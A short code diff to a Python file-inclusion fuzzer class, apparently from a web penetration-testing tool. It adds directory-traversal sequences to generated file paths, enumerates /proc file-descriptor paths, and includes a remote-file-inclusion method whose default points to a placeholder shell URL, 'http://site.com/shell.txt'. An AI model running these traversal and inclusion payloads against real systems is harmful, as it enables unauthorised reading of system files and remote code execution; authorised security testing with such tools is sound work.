@@ -140,7 +140,6 @@ class FileInclude(Fuzzer):
             for fd in range(minfd, maxfd + 1):
                 yield f'/proc/{pid}/fd/{fd}'
 
-
     def list(self, userpath=""):
         if self.os == 'windows':
             path = Paths.windowsfile
@@ -159,9 +158,10 @@ class FileInclude(Fuzzer):
     def rfi(self, remote='http://site.com/shell.txt'):
         return remote
 
-    def fuzz(self, data=''):
+    def fuzz(self, data='', upcnt=8):
         for file in self.list():
-            yield self.parent(data) + file
+            for up in self.ups:
+                yield self.parent(data) + self.sep + up * upcnt + file
 
     def parent(self, s):
         return self.join(self.split(s)[:-1])
